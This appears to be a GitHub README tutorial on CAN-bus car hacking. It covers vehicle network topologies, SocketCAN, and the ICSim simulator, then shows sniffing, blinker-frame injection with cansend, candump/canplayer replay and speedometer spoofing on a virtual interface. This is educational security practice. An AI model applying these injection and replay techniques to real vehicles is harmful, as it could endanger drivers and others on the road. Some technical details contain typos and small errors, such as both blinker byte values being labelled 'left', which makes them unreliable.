# Automotive-Security
On the New era of self driving technology automotive security has become one of the most interesting field for Security researchers. In this mordern world when you drive a car, you are driving a very powerfull computer that happens to have wheels and steering. Today there is no such component in a car that is not being moderated by a Computer. Hence the Risk of Being Exploited also increses.

## Overview

- [Network Topology](#network-topology)
- [Can-Bus](#can-bus)
  - it's Other Varients 
- [SocketCan](#socketcan)
  - Kayak
- [ICSim](#icsim)
- [Hacking CAN-Bus](#hacking-can-bus)
  - Sniffer
  - CAN Sender 
  - Replay Attack
  - Targeted Node Attack
  
## Network Topology
- Vehicles nowadays have dedicated ECU for working of each of Components such as Tire Pressure Monitor Systems, Temprature and Infortainment Control, Shaders Controls, Instrument Clusters etc. The Major Network Topologies used in CAN Networks are:
  - Bus Topology
  <img src = "https://user-images.githubusercontent.com/100958162/221414549-41b24b76-31d8-41f8-b46b-cc07ad614091.png" width ="50%">
  
  - Ring Topology
  <img src = "https://user-images.githubusercontent.com/100958162/221414835-44a2237b-cd2a-4b77-8451-e7cdb0baa36e.png" width = "50%" height = "200" >

  - Star Topology
  <img src="https://user-images.githubusercontent.com/100958162/221414844-5f38e79e-910f-4bf4-9f74-00f41b093edd.png" width="50%" height ="50%">
  
  **However the Network paradigm used inside most of the Vehicles nowadays is CAN-Bus Topology**
  <img src ="https://user-images.githubusercontent.com/100958162/221415320-84b8877a-e154-46d2-a09f-0cde3f7dce1c.png" width ="60%" height="300">
  
## CAN-Bus
Controlled Area Network or CAN Network is like the Nervous system of a car responsible for it's entire working and intervehicular communication. Since CAN-Bus follows bus topology each nodes are interconnected to a single bus line making it possible in a two way communication between any two nodes at a time.A node brodcastes a CAN signal to all the other node, the corresponding node with the matching destination adress captures the data. 
A Serial CAN Communication 

<img src="https://user-images.githubusercontent.com/100958162/221421092-2629f478-e5b4-4e2f-ba47-4dfae6ec2f36.png" width="50%" height="300">
- Can Networks can be interfaced using OBD ports, Usually they are present below the steering column or hidden somewhere in the dash.
- There are mainly two types of CAN Data 
  - Standard CAN PAckets 
  - Extended CAN Packets

#### Apart from CAN there are also other Protocols that are made by diffrent Brands are used for handiling diffrent technical situations inside the Car
- ISO-TP Protocol
  - Used to send CAN data Packets Exceeding 8byte of the Standard CAN protocol
- CanOpen Protocol
  - Changed the 11byte arbiary Id to a combination of 4bit function cod and 7bit Node ID, therefore csn be used for Precise Data Transfer
- The GMLAN Bus 
  - Uses Single Wire Low Speed and Double Wire High Speed Bus
- The SAEJ1850 Protocol
  - Old and Slower than Can But Easy to Imlement 
- The Keyword Protocol
  - Communicates through KWP2000 line(pin 7), the data may contain upto 255 byte
- The Local InterConnect Network Protocol
  - Faster than Can since it doesn't contain any Identifier ID, a single master Controls all the Slave Nodes
- The MOst Protocol
  - Media Oriented System Transport designed for multimedia devices, usually used to acces any internal mic or output Displays in a IVT Console or any hardware components that has a media console
- The Flex Ray Bus
  - High Speed Data Transfer Upto 10Mbps, Uses twisted wires to communicate, but can also used dual-channel communication.
- Automotive Ethernet

## SocketCan 
SocketCan is a Linux Utility that combines/unifies all the CAN tools and it's diffrent interfaces to a uniques interface. It Can also be used to create tools for supporting CAN, that enables us to try diffrent Options on the Persisting Can Networks. SocketCan ties user to the Linux Netwroking Kernal making it possible for creating a sperate interface for unifying all the CAN Networks.
A detailed writeup on Installing and Configuring SocketCan is given on it's Official [Github](https://github.com/linux-can/socketcand)

### Kayak 
- [Kayak](http://kayak.2codeornot2code.org/) is a Java based GUI Tool Used for Monitoring and Diagnosing CAN Data using SocketCan Interfaces. Kayak links with Open Maps for mapping and can handle CAN defenitions. Since it is Java Based app it can run on any platform. Kayak Latest [Realese](https://github.com/dschanoeh/Kayak/releases/tag/untagged-3597039ad20ce9798a99) 

## ICSim
To practice CAN-Bus exploitation we will be using an ICSim package from Craig Smith. ICSim includes a dashboard with speedometer, door lock
indicators, turn signal indicators and a control panel. The control panel allows the user to interact with the simulated automobile network, applying
acceleration, brakes, controlling the door locks and turn signals.
### Installing ICSim

You will need:
* SDL2
* SDL2_Image
* can-utils

You can get can-utils from github or on Ubuntu you may run the follwoing

```
  sudo apt-get install libsdl2-dev libsdl2-image-dev can-utils  
```

You can run the following commands to setup a virtual can interface

```
  sudo modprobe can
  sudo modprobe vcan
  sudo ip link add dev vcan0 type vcan
  sudo ip link set up vcan0
```

If you type ifconfig vcan0 you should see a vcan0 interface. A setup_vcan.sh file has also been provided with this
repo.

**Usage**

Default operations:

Start the Instrument Cluster (IC) simulator:

```
  ./icsim vcan0
```

Then startup the controls

```
  ./controls vcan0
```
<table align="center">
<tr>
<td><img src="https://user-images.githubusercontent.com/100958162/221443075-da04eb22-d9a1-48c4-b414-d71bff62f33a.png" width ="100%" height="80%"></td>
<td><img src="https://user-images.githubusercontent.com/100958162/221443109-0245da80-a0f4-47a2-b0fc-8660d29b5fb3.png" width="50%" height="50%"></td>
</tr>
</table>

## Hacking CAN-Bus
- As previously stated, the CAN-Bus communication protocol utilizes a broadcasting mechanism to share data packets, allowing each node within the network to transmit messages to one another. In order to achieve this, a message is broadcasted to the entire server by one of the nodes, and the source node captures it while all other nodes disregard it.
- By exploiting this feature, an attacker within the network can potentially send data to any other node, creating a vulnerability that could lead to a fault injection attack. 

### Sniffing CAN Data
- Setup the Virtual CAN network by running the setup_vcan.sh file in ICSim
```sh
./setup_vcan.sh
```
- Initialise the Controller and the Vrtual Instrument Cluster and Try to Send Data using the Controller 
```sh
./icsim vcan0
./controller vcan0
```
- Sniffing the Data using cansniffer 
```cansniffer vcan0````
``` cansniffer -c vcan0```
- You can use the -c argument to shoe the changing bits in the data in a diffrent color
 
 The Sniffed Can Data Should Look like this:-
 ```sh
 81|ms | ID  | data ...     < vcan0 # l=20 h=100 t=500 slots=36 >
00015 | 039 | 00 2A                   .*
00009 | 095 | 80 00 07 F8 00 00 00 31 .......1
00009 | 133 | 00 00 00 00 98          .....
00009 | 136 | 00 02 00 00 00 00 00 1B ........
00009 | 13A | 00 00 00 00 00 00 00 0A ........
00009 | 13F | 00 00 00 05 00 00 00 00 ........
00009 | 143 | 6B 6B 00 C2             kk..
00009 | 158 | 00 00 00 00 00 00 00 0A ........
00009 | 161 | 00 00 05 50 01 08 00 0D ...P....
00009 | 164 | 00 00 C0 1A A8 00 00 22 ......."
00009 | 166 | D0 32 00 09             .2..
00009 | 17C | 00 00 00 00 10 00 00 03 ........
00008 | 183 | 00 00 00 0D 00 00 10 0E ........
00501 | 188 | 00 00 00 00             ....
00009 | 18E | 00 00 4D                ..M
00009 | 191 | 01 00 10 A1 41 00 38    ....A.8
00020 | 1A4 | 00 00 00 08 00 00 00 2F ......./
00019 | 1AA | 7F FF 00 00 00 00 68 2F ......h/
00019 | 1B0 | 00 0F 00 00 00 01 66    ......f
00020 | 1CF | 80 05 00 00 00 0F       ......
00020 | 1DC | 02 00 00 0C             ....
00040 | 21E | 03 E8 37 45 22 06 2F    ..7E"./
00015 | 244 | 00 00 00 01 6A          ....j
00039 | 294 | 04 0B 00 02 CF 5A 00 2C .....Z.,
00106 | 305 | 80 35                   .5
00100 | 309 | 00 00 00 00 00 00 00 B1 ........
00099 | 320 | 00 00 21                ..!
00099 | 324 | 74 65 00 00 00 00 0E 29 te.....)
00099 | 333 | 00 00 00 00 00 00 2D    ......-
00099 | 37C | FD 00 FD 00 09 7F 00 29 .......)
00300 | 405 | 00 00 04 00 00 00 00 1A ........
00300 | 40C | 03 31 33 38 34 39 00 0D .13849..
00300 | 428 | 01 04 00 00 52 1C 10    ....R..
00300 | 454 | 23 EF 09                #..
01260 | 5A1 | 96 00 00 00 00 00 62 10 ......b.
```
- Analysing the CAN Data Packet 

``` 188#000000``` 
- The above metnioned packet is used fo controlling the blinkers in the CAR, the arbitary ID of the packet is 188 denoting it stands for blinkers, the data is of 8 bit ```00 00 00 00```
- Now if the first byte in the data changes to **02** it denotes that the Left Blinker is turned On and if the first byte is 01 it denotes the left blinker is turned on.
- Any attakcer can get in the CAN-network using many attacking Vactors like OBD-II port or by attacing their IVT etc.

## Sending CAN Data/ Replay Attacks 
- CAN-utils provide an tool names cansend inorder to send CAN packets to the network 
- Below command send a data packets that turns on left Blinker
```sh
cansend vcan0 188#02000000
```
- This opens an lot of possible ways to attack the CAR after getting into the it's Network

## Replay Attack

Canplayer is a tool that is commonly used alongside CAN communication, enabling the transmission of various CAN packets to a single or multiple CAN ports. However, this functionality also introduces the possibility of a replay attack, in which an attacker captures and subsequently retransmits a previously recorded CAN packet in order to cause malicious behavior within the network. 
- Usage canplayer -I <infile> <interface_name>
```sh 
canplayer -I <infile> <interface_nmae>
```
- Infile Can be generated using ```candump``` command
```sh
candump -l vcan0
```
This Logs the data into a file. Which can be Later Replayed Using Canplayer
```sh
canplayer -I candump-2023-02-27_211403.log 
```
## Targeted Node attack
- In this attack we target a single node to be exploted.
- On Ananlysing the Data having the arbitary ID of the Target we identify the specific byte in Data which when changed alters the working of the Sensors or correspoding activity in the Car.
- On the Example below we are targeting the NODE that controls the Speed and RPM of the Cluster
  - The ID of the Dat is 244 and the last 3 bytes of data controls the actual speed in hex format.
  - I created a [script](https://github.com/Drupad-DeV/Automotive-Security/blob/main/speed.sh) that automates this whole process. 
  
Here is the Demo of the script being executed.

![github](https://user-images.githubusercontent.com/100958162/221551446-13dafbc0-f9cd-4f91-8909-fe7e0a8fe384.gif)
